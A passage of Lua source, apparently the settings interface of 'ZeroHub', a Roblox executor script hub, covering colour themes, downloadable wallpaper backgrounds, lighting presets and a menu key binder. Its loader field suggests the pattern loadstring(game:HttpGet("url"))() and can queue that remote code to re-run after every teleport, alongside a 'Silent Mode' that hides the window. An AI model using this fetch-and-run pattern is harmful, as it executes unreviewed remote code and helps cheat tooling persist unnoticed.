			ElementBackground = Color3.fromRGB(18, 18, 22),
			ElementStroke = Color3.fromRGB(22, 22, 28),
		},
		Midnight = {
			Accent = Color3.fromRGB(30, 55, 120),
			SliderFill = Color3.fromRGB(60, 100, 200),
			AccentText = Color3.fromRGB(100, 140, 220),
			Panel = Color3.fromRGB(14, 18, 30),
			Background = Color3.fromRGB(8, 10, 20),
			Stroke = Color3.fromRGB(25, 35, 60),
			ElementBackground = Color3.fromRGB(10, 14, 26),
			ElementStroke = Color3.fromRGB(22, 32, 55),
		},
		OLED = {
			Accent = Color3.fromRGB(20, 20, 20),
			SliderFill = Color3.fromRGB(120, 120, 135),
			AccentText = Color3.fromRGB(180, 180, 190),
			Panel = Color3.fromRGB(5, 5, 5),
			Background = Color3.fromRGB(0, 0, 0),
			Stroke = Color3.fromRGB(18, 18, 22),
			ElementBackground = Color3.fromRGB(5, 5, 5),
			ElementStroke = Color3.fromRGB(16, 16, 20),
		},
		Nocturne = {
			Accent = Color3.fromRGB(60, 40, 90),
			SliderFill = Color3.fromRGB(100, 70, 150),
			AccentText = Color3.fromRGB(150, 120, 200),
			Panel = Color3.fromRGB(16, 12, 24),
			Background = Color3.fromRGB(10, 8, 16),
			Stroke = Color3.fromRGB(30, 22, 45),
			ElementBackground = Color3.fromRGB(12, 10, 20),
			ElementStroke = Color3.fromRGB(28, 20, 42),
		},
		Obsidian = {
			Accent = Color3.fromRGB(30, 30, 35),
			SliderFill = Color3.fromRGB(90, 90, 100),
			AccentText = Color3.fromRGB(160, 160, 175),
			Panel = Color3.fromRGB(12, 12, 14),
			Background = Color3.fromRGB(6, 6, 8),
			Stroke = Color3.fromRGB(24, 24, 28),
			ElementBackground = Color3.fromRGB(10, 10, 12),
			ElementStroke = Color3.fromRGB(20, 20, 24),
		},
		Onyx = {
			Accent = Color3.fromRGB(25, 25, 30),
			SliderFill = Color3.fromRGB(70, 70, 80),
			AccentText = Color3.fromRGB(140, 140, 155),
			Panel = Color3.fromRGB(8, 8, 10),
			Background = Color3.fromRGB(4, 4, 5),
			Stroke = Color3.fromRGB(18, 18, 22),
		},
		Petrol = {
			Accent = Color3.fromRGB(20, 80, 90),
			SliderFill = Color3.fromRGB(30, 130, 145),
			AccentText = Color3.fromRGB(60, 180, 195),
			Panel = Color3.fromRGB(10, 18, 22),
			Background = Color3.fromRGB(6, 12, 14),
			Stroke = Color3.fromRGB(18, 35, 40),
			ElementBackground = Color3.fromRGB(8, 16, 20),
			ElementStroke = Color3.fromRGB(16, 30, 36),
		},
		Pine = {
			Accent = Color3.fromRGB(30, 80, 45),
			SliderFill = Color3.fromRGB(50, 130, 70),
			AccentText = Color3.fromRGB(80, 180, 100),
			Panel = Color3.fromRGB(12, 20, 14),
			Background = Color3.fromRGB(8, 14, 10),
			Stroke = Color3.fromRGB(22, 38, 26),
			ElementBackground = Color3.fromRGB(10, 18, 12),
			ElementStroke = Color3.fromRGB(20, 34, 24),
		},
		Sage = {
			Accent = Color3.fromRGB(90, 110, 80),
			SliderFill = Color3.fromRGB(130, 155, 115),
			AccentText = Color3.fromRGB(170, 195, 155),
			Panel = Color3.fromRGB(18, 20, 16),
			Background = Color3.fromRGB(12, 14, 10),
		},
		Shadow = {
			Accent = Color3.fromRGB(35, 35, 40),
			SliderFill = Color3.fromRGB(80, 80, 90),
			AccentText = Color3.fromRGB(130, 130, 145),
			Panel = Color3.fromRGB(14, 14, 16),
			Background = Color3.fromRGB(8, 8, 10),
			Stroke = Color3.fromRGB(26, 26, 30),
		},
		Slate = {
			Accent = Color3.fromRGB(50, 60, 70),
			SliderFill = Color3.fromRGB(90, 105, 120),
			AccentText = Color3.fromRGB(140, 160, 180),
			Panel = Color3.fromRGB(16, 18, 22),
			Background = Color3.fromRGB(10, 12, 14),
			Stroke = Color3.fromRGB(30, 35, 42),
		},
		Strata = {
			Accent = Color3.fromRGB(70, 55, 40),
			SliderFill = Color3.fromRGB(120, 95, 70),
			AccentText = Color3.fromRGB(180, 150, 110),
			Panel = Color3.fromRGB(18, 15, 12),
			Background = Color3.fromRGB(12, 10, 8),
			Stroke = Color3.fromRGB(35, 28, 22),
		},
		Vapor = {
			Accent = Color3.fromRGB(120, 80, 160),
			SliderFill = Color3.fromRGB(170, 120, 220),
			AccentText = Color3.fromRGB(200, 160, 240),
			Panel = Color3.fromRGB(18, 14, 24),
			Background = Color3.fromRGB(12, 8, 16),
		},
		Velvet = {
			Accent = Color3.fromRGB(120, 30, 60),
			SliderFill = Color3.fromRGB(170, 50, 90),
			AccentText = Color3.fromRGB(220, 90, 130),
			Panel = Color3.fromRGB(20, 10, 14),
			Background = Color3.fromRGB(14, 6, 10),
			Stroke = Color3.fromRGB(40, 18, 28),
		},
		Wine = {
			Accent = Color3.fromRGB(100, 25, 40),
			SliderFill = Color3.fromRGB(150, 40, 65),
			AccentText = Color3.fromRGB(200, 70, 100),
			Panel = Color3.fromRGB(18, 10, 12),
			Background = Color3.fromRGB(12, 6, 8),
		},
		Arctic = {
			Accent = Color3.fromRGB(140, 180, 210),
			SliderFill = Color3.fromRGB(160, 200, 230),
			AccentText = Color3.fromRGB(200, 225, 245),
			Panel = Color3.fromRGB(16, 20, 26),
			Background = Color3.fromRGB(10, 14, 18),
			Stroke = Color3.fromRGB(30, 40, 50),
		},
		Coral = {
			Accent = Color3.fromRGB(210, 100, 80),
			SliderFill = Color3.fromRGB(230, 130, 110),
			AccentText = Color3.fromRGB(245, 165, 145),
			Panel = Color3.fromRGB(22, 14, 12),
			Background = Color3.fromRGB(16, 10, 8),
		},
		Dusk = {
			Accent = Color3.fromRGB(150, 80, 120),
			SliderFill = Color3.fromRGB(180, 110, 150),
			AccentText = Color3.fromRGB(210, 145, 180),
			Panel = Color3.fromRGB(20, 14, 18),
			Background = Color3.fromRGB(14, 8, 12),
			Stroke = Color3.fromRGB(38, 26, 34),
		},
		Ember = {
			Accent = Color3.fromRGB(190, 70, 20),
			SliderFill = Color3.fromRGB(220, 100, 40),
			AccentText = Color3.fromRGB(240, 140, 70),
			Panel = Color3.fromRGB(22, 12, 8),
			Background = Color3.fromRGB(16, 8, 4),
		},
		Frost = {
			Accent = Color3.fromRGB(100, 160, 200),
			SliderFill = Color3.fromRGB(130, 190, 230),
			AccentText = Color3.fromRGB(170, 215, 245),
			Panel = Color3.fromRGB(14, 18, 24),
			Background = Color3.fromRGB(8, 12, 16),
			Stroke = Color3.fromRGB(25, 35, 48),
			ElementBackground = Color3.fromRGB(10, 15, 22),
			ElementStroke = Color3.fromRGB(22, 32, 44),
		},
		Sakura = {
			Accent = Color3.fromRGB(230, 140, 170),
			SliderFill = Color3.fromRGB(240, 170, 195),
			AccentText = Color3.fromRGB(250, 200, 215),
			Panel = Color3.fromRGB(24, 16, 20),
			Background = Color3.fromRGB(16, 10, 14),
			Stroke = Color3.fromRGB(45, 28, 36),
			ElementBackground = Color3.fromRGB(20, 12, 16),
			ElementStroke = Color3.fromRGB(40, 25, 32),
		},
		Neon = {
			Accent = Color3.fromRGB(0, 255, 140),
			SliderFill = Color3.fromRGB(40, 255, 170),
			AccentText = Color3.fromRGB(100, 255, 200),
			Panel = Color3.fromRGB(8, 16, 12),
			Background = Color3.fromRGB(4, 10, 6),
			Stroke = Color3.fromRGB(14, 40, 28),
			ElementBackground = Color3.fromRGB(6, 14, 10),
			ElementStroke = Color3.fromRGB(12, 35, 24),
		},
		Cobalt = {
			Accent = Color3.fromRGB(60, 90, 220),
			SliderFill = Color3.fromRGB(80, 120, 240),
			AccentText = Color3.fromRGB(120, 155, 250),
			Panel = Color3.fromRGB(12, 14, 28),
			Background = Color3.fromRGB(6, 8, 18),
			Stroke = Color3.fromRGB(22, 28, 55),
			ElementBackground = Color3.fromRGB(10, 12, 24),
			ElementStroke = Color3.fromRGB(20, 24, 48),
		},
		Rust = {
			Accent = Color3.fromRGB(160, 70, 40),
			SliderFill = Color3.fromRGB(190, 95, 55),
			AccentText = Color3.fromRGB(220, 130, 85),
			Panel = Color3.fromRGB(22, 14, 10),
			Background = Color3.fromRGB(14, 8, 6),
			Stroke = Color3.fromRGB(40, 26, 18),
			ElementBackground = Color3.fromRGB(18, 10, 8),
			ElementStroke = Color3.fromRGB(36, 22, 16),
		},
		Glacier = {
			Accent = Color3.fromRGB(160, 210, 240),
			SliderFill = Color3.fromRGB(180, 225, 250),
			AccentText = Color3.fromRGB(210, 240, 255),
			Panel = Color3.fromRGB(14, 20, 26),
			Background = Color3.fromRGB(8, 14, 18),
			Stroke = Color3.fromRGB(28, 42, 52),
			ElementBackground = Color3.fromRGB(12, 18, 22),
			ElementStroke = Color3.fromRGB(24, 36, 46),
		},
		Phantom = {
			Accent = Color3.fromRGB(80, 60, 110),
			SliderFill = Color3.fromRGB(110, 85, 150),
			AccentText = Color3.fromRGB(150, 125, 200),
			Panel = Color3.fromRGB(14, 10, 18),
			Background = Color3.fromRGB(8, 6, 12),
			Stroke = Color3.fromRGB(28, 22, 38),
			ElementBackground = Color3.fromRGB(12, 8, 16),
			ElementStroke = Color3.fromRGB(24, 18, 34),
		},
		Lavender = {
			Accent = Color3.fromRGB(170, 140, 210),
			SliderFill = Color3.fromRGB(190, 165, 230),
			AccentText = Color3.fromRGB(215, 195, 245),
			Panel = Color3.fromRGB(20, 16, 26),
			Background = Color3.fromRGB(14, 10, 18),
			Stroke = Color3.fromRGB(36, 30, 48),
			ElementBackground = Color3.fromRGB(16, 12, 22),
			ElementStroke = Color3.fromRGB(32, 26, 42),
		},
		Toxic = {
			Accent = Color3.fromRGB(120, 200, 20),
			SliderFill = Color3.fromRGB(150, 220, 50),
			AccentText = Color3.fromRGB(180, 240, 90),
			Panel = Color3.fromRGB(14, 20, 8),
			Background = Color3.fromRGB(8, 14, 4),
			Stroke = Color3.fromRGB(26, 40, 14),
			ElementBackground = Color3.fromRGB(10, 18, 6),
			ElementStroke = Color3.fromRGB(22, 36, 12),
		},
		["Blood Moon"] = {
			Accent = Color3.fromRGB(180, 20, 30),
			SliderFill = Color3.fromRGB(210, 40, 50),
			AccentText = Color3.fromRGB(240, 80, 90),
			Panel = Color3.fromRGB(22, 8, 10),
			Background = Color3.fromRGB(14, 4, 6),
			Stroke = Color3.fromRGB(42, 16, 20),
			ElementBackground = Color3.fromRGB(18, 6, 8),
			ElementStroke = Color3.fromRGB(38, 14, 18),
		},
		Electric = {
			Accent = Color3.fromRGB(0, 180, 255),
			SliderFill = Color3.fromRGB(40, 200, 255),
			AccentText = Color3.fromRGB(100, 220, 255),
			Panel = Color3.fromRGB(8, 18, 26),
			Background = Color3.fromRGB(4, 12, 18),
			Stroke = Color3.fromRGB(14, 36, 50),
			ElementBackground = Color3.fromRGB(6, 16, 22),
			ElementStroke = Color3.fromRGB(12, 32, 44),
		},
	}

	local Theme = Interface:AddGroupbox("Theme")

	local ZeroAccent = Theme:AddColorPicker("ZeroAccent", {
		Text = "Accent Color",
		Default = theme.Accent,
		Callback = function(arg3)
			tbl:SetAccent(arg3)
		end,
	})

	local ZeroCursor = Theme:AddColorPicker("ZeroCursor", {
		Text = "Cursor Color",
		Default = settings.CursorColor,
		Callback = function(cursorColor)
			settings.CursorColor = cursorColor

			pcall(function()
				local window = tbl.Window

				if window and window.Cursor then
					window.Cursor.ImageColor3 = cursorColor
				end
			end)
		end,
	})

	Theme:AddDropdown("_ZeroPremade", {
		Text = "Premade Themes",
		Values = {
			"Violet",
			"Crimson",
			"Emerald",
			"Amber",
			"Rose",
			"Cyan",
			"Mono",
			"Midnight",
			"OLED",
			"Nocturne",
			"Obsidian",
			"Onyx",
			"Petrol",
			"Pine",
			"Sage",
			"Shadow",
			"Slate",
			"Strata",
			"Vapor",
			"Velvet",
			"Wine",
			"Arctic",
			"Coral",
			"Dusk",
			"Ember",
			"Frost",
		},
		Callback = function(arg3)
			local v21 = tbl17[arg3]
			if not v21 then
				return
			end

			if v21.Panel then
				theme.Panel = v21.Panel
			end

			if v21.Background then
				theme.Background = v21.Background
			end

			if v21.Stroke then
				theme.Stroke = v21.Stroke
			end

			if v21.ElementBackground then
				theme.ElementBackground = v21.ElementBackground
			end

			if v21.ElementStroke then
				theme.ElementStroke = v21.ElementStroke
			end

			if v21.AccentText then
				theme.AccentText = v21.AccentText
			end

			if v21.SliderFill then
				theme.SliderFill = v21.SliderFill
			end

			if v21.Accent then
				ZeroAccent:SetValue(v21.Accent)
			end

			if v21.Accent then
				ZeroCursor:SetValue(v21.AccentText or v21.Accent)
			end

			for _, sliderFill in ipairs(tbl.SliderFills) do
				if sliderFill and sliderFill.Parent then
					sliderFill.BackgroundColor3 = theme.SliderFill
				end
			end

			tbl:ApplyFullTheme()
		end,
	})

	local Background = Interface:AddGroupbox("Background")
	local imageLabel = nil

	local tbl18 = {
		None = "",
		Ichigo = "https://wallpapercg.com/download/ichigo-kurosaki-3840x2160-14945.jpeg",
		LeBron = "https://s.hdnux.com/photos/01/31/34/44/23447814/3/rawImage.jpg",
		["Sakura Girl"] = "https://cdn.wallpapersafari.com/16/57/jrIgRf.jpg",
		["Blue Butterfly"] = "https://4kwallpapers.com/images/wallpapers/anime-girl-1920x1080-10025.jpg",
		["Goku Black"] = "https://4kwallpapers.com/images/wallpapers/goku-black-dragon-3840x2160-14721.jpg",
		Luffy = "https://wallpapercave.com/wp/wp11464927.jpg",
		Goku = "https://wallpapercave.com/wp/wp12437470.jpg",
		Tanjiro = "https://4kwallpapers.com/images/wallpapers/tanjiro-kamado-1920x1080-9324.jpg",
		Gojo = "https://wallpapercave.com/wp/wp14352025.jpg",
		Sukuna = "https://motionbgs.com/media/5593/heian-era-sukuna.jpg",
		Vegeta = "https://www.xtrafondos.com/wallpapers/dragon-ball-super-vegeta-ultra-ego-10712.jpg",
		["Neon City"] = "https://wallpapercave.com/wp/wp2324426.jpg",
		["Tokyo Night"] = "https://wallpaperaccess.com/full/26371.jpg",
		Wave = "https://wallpaperaccess.com/full/6039359.jpg",
		Yoruichi = "https://fictionhorizon.com/wp-content/uploads/2023/07/YoruichiCat.jpg",
		["Aesthetic Sky"] = "https://cdn.wallpapersafari.com/43/24/4JY2Ct.jpg",
	}

	local function fn43(arg3)
		if not arg3 or arg3 == "" then
			if imageLabel then
				imageLabel.Visible = false
			end

			return
		end

		task.spawn(function()
			local v21 = nil

			if arg3:match("^rbxassetid://") then
				v21 = arg3
			else
				local str5 = "ZeroHub/bg_" .. tostring(arg3:match("[^/]+$") or "custom"):gsub("[^%w_%-%.]+", "_"):sub(1, 40) .. ".png"

				pcall(function()
					if not isfile(str5) then
						writefile(str5, game:HttpGet(arg3))
					end

					v21 = getcustomasset(str5)
				end)
			end

			if not v21 then
				tbl:Notify({ Title = "Theme", Description = "Failed to load image.", Type = "Error" })
				return
			end

			if not imageLabel then
				flag5 = false
				imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = "ThemeBg"
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ImageTransparency = 0.88
				imageLabel.ScaleType = Enum.ScaleType.Crop
				imageLabel.ZIndex = 0
				imageLabel.Parent = arg2.Main
				Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(0, 3)
				flag5 = true
			end

			imageLabel.Image = v21
			imageLabel.Visible = true
		end)
	end

	Background:AddDropdown("_ZeroBgPreset", {
		Text = "Background Preset",
		Description = "Pre-made background themes.",
		Values = {
			"None",
			"Goku Black",
			"Goku",
			"Vegeta",
			"Gojo",
			"Sukuna",
			"Luffy",
			"Tanjiro",
			"Ichigo",
			"Yoruichi",
			"Neon City",
			"Tokyo Night",
			"Wave",
			"Aesthetic Sky",
			"LeBron",
			"Sakura Girl",
			"Blue Butterfly",
		},
		Default = "None",
		Callback = function(arg3)
			local v21 = tbl18[arg3]

			if v21 == "" then
				if imageLabel then
					imageLabel.Visible = false
				end

				pcall(function()
					if isfile("ZeroHub/theme_bg_url.txt") then
						delfile("ZeroHub/theme_bg_url.txt")
					end
				end)
			else
				pcall(function()
					writefile("ZeroHub/theme_bg_url.txt", v21)
				end)

				fn43(v21)
			end
		end,
	})

	Background:AddInput("_ZeroBgImage", {
		Text = "Background Image",
		Description = "Paste image URL or rbxassetid",
		Placeholder = "https://... or rbxassetid://...",
		Callback = function(arg3)
			pcall(function()
				writefile("ZeroHub/theme_bg_url.txt", arg3)
			end)

			fn43(arg3)
		end,
	})

	Background:AddSlider("_ZeroBgTransparency", {
		Text = "Background Opacity",
		Min = 0,
		Max = 100,
		Default = 12,
		Suffix = "%",
		Callback = function(arg3)
			local n3 = arg3 / 100

			if imageLabel then
				imageLabel.ImageTransparency = 1 - n3
			end

			local backgroundTransparency = math.clamp(n3 * 0.7, 0, 0.85)

			pcall(function()
				for _, child in ipairs(arg2.GroupboxesHolder:GetChildren()) do
					if child:IsA("ScrollingFrame") then
						for _, child2 in ipairs(child:GetChildren()) do
							if child2:IsA("Frame") and child2.Name == "Groupbox" then
								child2.BackgroundTransparency = backgroundTransparency
							end
						end
					end
				end
			end)
		end,
	})

	Background:AddButton({
		Text = "Clear Background",
		Color = Color3.fromRGB(70, 70, 86),
		Func = function()
			if imageLabel then
				imageLabel.Visible = false
			end

			pcall(function()
				if isfile("ZeroHub/theme_bg_url.txt") then
					delfile("ZeroHub/theme_bg_url.txt")
				end
			end)

			tbl:Notify({ Title = "Theme", Description = "Background cleared.", Type = "Info" })
		end,
	})

	pcall(function()
		if isfile("ZeroHub/theme_bg_url.txt") then
			local txt = readfile("ZeroHub/theme_bg_url.txt")

			if txt and txt ~= "" then
				fn43(txt)
			end
		end
	end)

	local Shaders = Interface:AddGroupbox("Shaders")
	local tbl19 = {}

	local function fn44()
		local Lighting = game:GetService("Lighting")

		tbl19 = {
			ClockTime = Lighting.ClockTime,
			Brightness = Lighting.Brightness,
			Ambient = Lighting.Ambient,
			OutdoorAmbient = Lighting.OutdoorAmbient,
			FogEnd = Lighting.FogEnd,
			FogColor = Lighting.FogColor,
		}

		pcall(function()
			local colorCorrectionEffect = Lighting:FindFirstChildOfClass("ColorCorrectionEffect")

			if colorCorrectionEffect then
				tbl19.CC = {
					Brightness = colorCorrectionEffect.Brightness,
					Contrast = colorCorrectionEffect.Contrast,
					Saturation = colorCorrectionEffect.Saturation,
					TintColor = colorCorrectionEffect.TintColor,
					Enabled = colorCorrectionEffect.Enabled,
				}
			end

			local bloomEffect = Lighting:FindFirstChildOfClass("BloomEffect")

			if bloomEffect then
				tbl19.Bloom = { Intensity = bloomEffect.Intensity, Size = bloomEffect.Size, Threshold = bloomEffect.Threshold, Enabled = bloomEffect.Enabled }
			end

			local blurEffect = Lighting:FindFirstChildOfClass("BlurEffect")

			if blurEffect then
				tbl19.Blur = { Size = blurEffect.Size, Enabled = blurEffect.Enabled }
			end

			local sunRaysEffect = Lighting:FindFirstChildOfClass("SunRaysEffect")

			if sunRaysEffect then
				tbl19.SunRays = { Intensity = sunRaysEffect.Intensity, Spread = sunRaysEffect.Spread, Enabled = sunRaysEffect.Enabled }
			end

			local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")

			if atmosphere then
				tbl19.Atm = {
					Density = atmosphere.Density,
					Offset = atmosphere.Offset,
					Glare = atmosphere.Glare,
					Haze = atmosphere.Haze,
					Color = atmosphere.Color,
				}
			end
		end)
	end

	local function fn45(arg3)
		local Lighting = game:GetService("Lighting")
		local instance = Lighting:FindFirstChildOfClass(arg3)

		if not instance then
			instance = Instance.new(arg3)
			instance.Parent = Lighting
		end

		pcall(function()
			instance.Enabled = true
		end)

		return instance
	end

	local function fn46(arg3)
		local Lighting = game:GetService("Lighting")

		local sethiddenproperty = getfenv().sethiddenproperty or function()
		end

		if arg3 == "None" then
			if tbl19.ClockTime then
				Lighting.ClockTime = tbl19.ClockTime
				Lighting.Brightness = tbl19.Brightness
				Lighting.Ambient = tbl19.Ambient
				Lighting.OutdoorAmbient = tbl19.OutdoorAmbient
				Lighting.FogEnd = tbl19.FogEnd
				Lighting.FogColor = tbl19.FogColor
			end

			pcall(function()
				if tbl19.CC then
					local colorCorrectionEffect = Lighting:FindFirstChildOfClass("ColorCorrectionEffect")

					if colorCorrectionEffect then
						colorCorrectionEffect.Brightness = tbl19.CC.Brightness
						colorCorrectionEffect.Contrast = tbl19.CC.Contrast
						colorCorrectionEffect.Saturation = tbl19.CC.Saturation
						colorCorrectionEffect.TintColor = tbl19.CC.TintColor
						colorCorrectionEffect.Enabled = tbl19.CC.Enabled
					end
				end
			end)

			pcall(function()
				if tbl19.Bloom then
					local bloomEffect = Lighting:FindFirstChildOfClass("BloomEffect")

					if bloomEffect then
						bloomEffect.Intensity = tbl19.Bloom.Intensity
						bloomEffect.Size = tbl19.Bloom.Size
						bloomEffect.Threshold = tbl19.Bloom.Threshold
						bloomEffect.Enabled = tbl19.Bloom.Enabled
					end
				end
			end)

			pcall(function()
				if tbl19.Atm then
					local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")

					if atmosphere then
						atmosphere.Density = tbl19.Atm.Density
						atmosphere.Offset = tbl19.Atm.Offset
						atmosphere.Glare = tbl19.Atm.Glare
						atmosphere.Haze = tbl19.Atm.Haze
					end
				end
			end)

			return
		end

		pcall(function()
			sethiddenproperty(Lighting, "Technology", "ShadowMap")
		end)

		if arg3 == "Cinematic" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.05
			ColorCorrectionEffect.Contrast = 0.25
			ColorCorrectionEffect.Saturation = -0.15
			ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 240, 220)
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.4
			BloomEffect.Size = 24
			BloomEffect.Threshold = 1.2
			local DepthOfFieldEffect = fn45("DepthOfFieldEffect")
			DepthOfFieldEffect.FarIntensity = 0.3
			DepthOfFieldEffect.FocusDistance = 30
			DepthOfFieldEffect.InFocusRadius = 20
			DepthOfFieldEffect.NearIntensity = 0.2
			local SunRaysEffect = fn45("SunRaysEffect")
			SunRaysEffect.Intensity = 0.08
			SunRaysEffect.Spread = 0.6
		elseif arg3 == "Anime" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.08
			ColorCorrectionEffect.Contrast = 0.35
			ColorCorrectionEffect.Saturation = 0.3
			ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 250, 245)
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.5
			BloomEffect.Size = 30
			BloomEffect.Threshold = 1
			Lighting.Brightness = 2.5
		elseif arg3 == "Dark" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = -0.12
			ColorCorrectionEffect.Contrast = 0.4
			ColorCorrectionEffect.Saturation = -0.5
			ColorCorrectionEffect.TintColor = Color3.fromRGB(200, 210, 230)
			Lighting.Brightness = 1.2
			Lighting.Ambient = Color3.fromRGB(20, 20, 30)
		elseif arg3 == "Sunset" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.06
			ColorCorrectionEffect.Contrast = 0.2
			ColorCorrectionEffect.Saturation = 0.15
			ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 200, 160)
			Lighting.ClockTime = 17.5
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.6
			BloomEffect.Size = 35
			BloomEffect.Threshold = 0.9
			local Atmosphere = fn45("Atmosphere")
			Atmosphere.Density = 0.35
			Atmosphere.Offset = 0.2
			Atmosphere.Glare = 1.5
			Atmosphere.Haze = 3
		elseif arg3 == "Night" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = -0.08
			ColorCorrectionEffect.Contrast = 0.3
			ColorCorrectionEffect.Saturation = -0.2
			ColorCorrectionEffect.TintColor = Color3.fromRGB(170, 190, 255)
			Lighting.ClockTime = 0
			Lighting.Brightness = 0.8
			Lighting.Ambient = Color3.fromRGB(30, 30, 60)
		elseif arg3 == "Neon" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.1
			ColorCorrectionEffect.Contrast = 0.5
			ColorCorrectionEffect.Saturation = 0.6
			ColorCorrectionEffect.TintColor = Color3.fromRGB(230, 220, 255)
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.8
			BloomEffect.Size = 40
			BloomEffect.Threshold = 0.8
			Lighting.Brightness = 2.8
		elseif arg3 == "Soft" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.04
			ColorCorrectionEffect.Contrast = -0.1
			ColorCorrectionEffect.Saturation = -0.1
			ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 248, 240)
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.3
			BloomEffect.Size = 28
			BloomEffect.Threshold = 1.4
		elseif arg3 == "Autumn" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.03
			ColorCorrectionEffect.Contrast = 0.25
			ColorCorrectionEffect.Saturation = 0.1
			ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 215, 170)
			Lighting.ClockTime = 16
			Lighting.Brightness = 2.2
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.45
			BloomEffect.Size = 28
			BloomEffect.Threshold = 1.1
			local Atmosphere = fn45("Atmosphere")
			Atmosphere.Density = 0.3
			Atmosphere.Offset = 0.15
			Atmosphere.Haze = 2.5
		elseif arg3 == "Winter" then
			local ColorCorrectionEffect = fn45("ColorCorrectionEffect")
			ColorCorrectionEffect.Brightness = 0.06
			ColorCorrectionEffect.Contrast = 0.15
			ColorCorrectionEffect.Saturation = -0.3
			ColorCorrectionEffect.TintColor = Color3.fromRGB(220, 235, 255)
			Lighting.Brightness = 2.5
			Lighting.Ambient = Color3.fromRGB(180, 195, 220)
			local BloomEffect = fn45("BloomEffect")
			BloomEffect.Intensity = 0.55
			BloomEffect.Size = 32
			BloomEffect.Threshold = 1
			local Atmosphere = fn45("Atmosphere")
			Atmosphere.Density = 0.4
			Atmosphere.Offset = 0.3
			Atmosphere.Haze = 4
		end
	end

	fn44()

	Shaders:AddDropdown("_ZeroShader", {
		Text = "Shader Preset",
		Description = "Changes game lighting and effects.",
		Values = { "None", "Cinematic", "Anime", "Dark", "Sunset", "Night", "Neon", "Soft", "Autumn", "Winter" },
		Default = "None",
		Callback = function(arg3)
			fn46(arg3)
		end,
	})

	local Interface2 = Interface:AddGroupbox("Interface")
	local flag7 = false
	local v21 = nil

	v21 = Interface2:AddButton({
		Text = "Show / Hide Key: " .. (tbl.ToggleKey and tbl.ToggleKey.Name or "Right Shift"),
		Func = function()
			if flag7 then
				return
			end
			flag7 = true
			v21:SetText("Press any key...")
		end,
	})

	fn14(UserInputService.InputBegan, function(arg3)
		if flag7 and arg3.UserInputType == Enum.UserInputType.Keyboard then
			flag7 = false
			tbl.ToggleKey = arg3.KeyCode

			pcall(function()
				writefile("ZeroHub/Zero_MenuKey.txt", arg3.KeyCode.Name)
			end)

			v21:SetText("Show / Hide Key: " .. arg3.KeyCode.Name)
		end
	end)

	Interface2:AddToggle("_ZeroAutoHide", {
		Text = "Silent Mode",
		Description = "Hides the window on execution and disables notifications. Use with auto-load config if you wish.",
		Default = false,
	})

	local zeroQueueScript = Interface2:AddInput("_ZeroQueueScript", {
		Text = "Loader Script",
		Placeholder = "loadstring(game:HttpGet(\"url\"))()",
		Default = Config and Config.QueueScript or "",
		Callback = function(arg3)
			if tbl.Flags._ZeroQueueOnTeleport and arg3 and arg3 ~= "" then
				pcall(function()
					if queue_on_teleport then
						queue_on_teleport(arg3)
					end
				end)
			end
		end,
	})

	Interface2:AddToggle("_ZeroQueueOnTeleport", {
		Text = "Queue On Teleport",
		Description = "Re-executes the loader script above after teleporting.",
		Default = false,
		Callback = function(arg3)
			if arg3 then
				local value = zeroQueueScript.Value

				if not value or value == "" then
					tbl:Notify({
						Title = "Queue On Teleport",
						Description = "Paste your loader script in the field above first.",
						Type = "Warning",
					})

					return
				end

				pcall(function()
					if queue_on_teleport then
						queue_on_teleport(value)
					end
				end)
			end
		end,
	})

	Interface2:AddToggle("_ZeroCursorToggle", {
		Text = "Custom Cursor",
		Description = "Toggles the custom cursor overlay. Disable to use the default Roblox cursor.",
		Default = settings.CursorEnabled,
		Callback = function(cursorEnabled)
			settings.CursorEnabled = cursorEnabled

			if arg2.Cursor then
				arg2.Cursor.Visible = cursorEnabled and arg2.Main.Visible
			end

			UserInputService.MouseIconEnabled = not (cursorEnabled and arg2.Main and arg2.Main.Visible)
		end,
	})

	local tbl20 = {}
	local png = nil
	local flag8 = false

	local function fn47()
		if flag8 then
			return
		end
		flag8 = true

		task.spawn(function()
			pcall(function()
				local response = game:HttpGet("https://raw.githubusercontent.com/aymanabdo0355-ctrl/Images/main/ChatGPT%20Image%20Jul%2017%2C%202026%2C%2011_47_50%20PM.png")

				if response and #response > 100 then
					writefile("ZeroHub/zh_icon.png", response)
					png = getcustomasset("ZeroHub/zh_icon.png")
				end
			end)

			if not png then
				return
			end
			local name = "_ZH_V"
			local localPlayer2 = game:GetService("Players").LocalPlayer

			local function fn48(parent2)
				if not parent2 or parent2:FindFirstChild("_ZH_V") then
					return
				end
				local stringValue = Instance.new("StringValue")
				stringValue.Name = name
				stringValue.Value = "1"
				stringValue.Parent = parent2
			end

			local function fn49(arg3)
				local head = arg3:FindFirstChild("Head")
				if not head or head:FindFirstChild("_ZH_BBG") then
					return
				end
				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = "_ZH_BBG"
				billboardGui.Adornee = head
